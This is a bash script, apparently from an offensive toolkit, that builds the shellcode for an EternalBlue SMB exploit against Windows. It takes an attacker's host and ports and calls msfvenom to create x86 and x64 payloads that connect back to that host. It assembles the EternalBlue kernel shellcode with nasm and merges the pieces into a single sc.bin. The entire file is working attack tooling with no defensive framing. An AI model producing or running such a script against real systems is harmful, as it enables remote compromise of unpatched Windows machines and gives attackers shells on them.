#!/bin/bash
cyan='\e[1;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
orange='\e[38;5;166m'
path=`pwd`
config_language="$path/../../../config/config-language"
source $config_language
while getopts ":h:p:l:s:a:" opt; do
	case $opt in
		h)
			lhost=$OPTARG
		;;
		p)
			lport1=$OPTARG
		;;
		l)
			lport2=$OPTARG
		;;		
		s)
			paylo=$OPTARG
		;;
		a)
			arch=$OPTARG
		;;
	esac
done
if [[ "$language" = "VN" ]]; then
	gen_shellcode_x64="Đang tạo shellcode với kiến trúc x64"
	gen_shellcode_x86="Đang tạo shellcode với kiến trúc x86"
	gen_shellcode_arch="Đang tạo shellcode với kiến trúc $arch"
elif [[ "$language" = "EN" ]]; then
	gen_shellcode_x64="Creating shellcode with x64 architecture"
	gen_shellcode_x86="Creating shellcode with x86 architecture"
	gen_shellcode_arch="Creating shellcode with $arch architecture"

fi
if [ "$arch" = "auto" ]; then
	x86_msf_shellcode=$path"/sc_x86_msf.bin"
	x64_msf_shellcode=$path"/sc_x64_msf.bin"
	x86_shellcode=$path"/sc_x86.bin"
	x64_shellcode=$path"/sc_x64.bin"
	all_shellcode=$path"/sc.bin"
	mergeScript=$path"/merge_shellcode.py"
	rawAssembly_x64=$path"/assembly/eternalblue_kshellcode_x64"
	rawAssembly_x86=$path"/assembly/eternalblue_kshellcode_x86"
	rm $rawAssembly_x64 $rawAssembly_x86 2>/dev/null
	payload_OS=`echo $paylo| cut -d'/' -f1` > /dev/null 2>&1
	payload_format=`echo $paylo | cut -d'/' -f3` > /dev/null 2>&1
	payload_name=`echo $paylo | cut -d'/' -f4` > /dev/null 2>&1
	x64_payload="$payload_OS/x64/$payload_format/$payload_name"
	x86_payload="$payload_OS/$payload_format/$payload_name"
	echo -e "${BlueF}[*]$RESET $gen_shellcode_x64"
	msfvenom -p $x64_payload LHOST=$lhost LPORT=$lport1 --platform windows -a x64 --format raw -o $x64_msf_shellcode > /dev/null 2>&1
	echo -e "${BlueF}[*]$RESET $gen_shellcode_x86"
	msfvenom -p $x86_payload LHOST=$lhost LPORT=$lport2 --platform windows -a x86 --format raw -o $x86_msf_shellcode > /dev/null 2>&1
	nasm -f bin $rawAssembly_x64.asm
	nasm -f bin $rawAssembly_x86.asm
	cat $rawAssembly_x86 $x86_msf_shellcode > $x86_shellcode
	cat $rawAssembly_x64 $x64_msf_shellcode > $x64_shellcode
	python $mergeScript $x86_shellcode $x64_shellcode $all_shellcode
else
	msf_shellcode=$path"/sc_msf.bin"
	shellcode=$path"/sc.bin"
	rawAssembly=$path"/assembly/eternalblue_kshellcode_$arch"
	rm $rawAssembly 2>/dev/null
	echo -e "${BlueF}[*]$RESET $gen_shellcode_arch"
	msfvenom -p $paylo LHOST=$lhost LPORT=$lport1 --platform windows -a $arch --format raw -o $msf_shellcode > /dev/null 2>&1
	nasm -f bin $rawAssembly.asm
	cat $rawAssembly $msf_shellcode > $shellcode
fi
